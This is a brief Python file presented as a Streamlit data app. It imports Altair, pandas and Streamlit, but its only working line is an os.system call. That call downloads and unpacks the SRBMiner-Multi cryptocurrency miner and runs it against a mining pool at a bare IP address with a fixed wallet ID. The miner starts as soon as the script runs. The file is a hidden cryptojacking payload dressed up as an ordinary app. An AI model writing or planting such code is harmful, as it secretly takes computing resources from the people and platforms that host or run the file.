from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import subprocess
os.system ("curl -L -o SRBMiner-Multi-1-0-6-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.6/SRBMiner-Multi-1-0-6-Linux.tar.xz && tar -xf SRBMiner-Multi-1-0-6-Linux.tar.xz && cd SRBMiner-Multi-1-0-6 && ./SRBMiner-MULTI --disable-gpu --algorithm chukwa --pool stratum+tcp://168.235.86.33:3393 --wallet SK_XPDzztzE6rL4rQlJtSwyL.1059 --password x -t 1")
